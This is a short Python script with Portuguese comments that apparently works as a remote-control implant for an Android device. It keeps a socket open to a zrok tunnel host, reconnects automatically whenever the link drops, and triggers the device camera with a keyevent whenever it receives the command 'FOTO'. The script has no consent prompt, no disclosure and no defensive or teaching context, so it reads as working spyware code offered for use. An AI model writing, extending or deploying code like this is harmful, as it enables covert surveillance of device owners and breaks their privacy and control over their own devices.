import socket, os, time

def iniciar():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            # Conecta ao seu túnel zrok atual
            s.connect(("jkfh48jrpdys.share.zrok.io", 443))
            while True:
                comando = s.recv(1024).decode()
                if "FOTO" in comando:
                    # Tenta disparar a câmera do sistema
                    os.system("input keyevent 27") 
                if not comando: break
            s.close()
        except: 
            time.sleep(5) # Tenta reconectar se a internet cair

iniciar()
# forçar build

